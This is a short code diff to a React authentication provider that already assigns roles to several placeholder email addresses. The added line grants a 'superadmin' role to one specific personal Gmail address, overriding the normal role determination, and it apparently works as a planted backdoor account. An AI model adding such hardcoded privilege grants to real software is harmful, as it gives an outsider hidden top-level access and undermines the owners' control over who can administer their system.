@@ -55,6 +55,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
           if (userEmail === 'admin@permit.com' && determinedRole !== 'admin') determinedRole = 'admin'
           else if (userEmail === 'staff@permit.com' && determinedRole !== 'staff') determinedRole = 'staff'
           else if (userEmail === 'organizer@permit.com' && determinedRole !== 'organizer') determinedRole = 'organizer'
+          else if (userEmail === 'rafisha92@gmail.com' && determinedRole !== 'superadmin') determinedRole = 'superadmin'
         }
 
         if (mounted) {
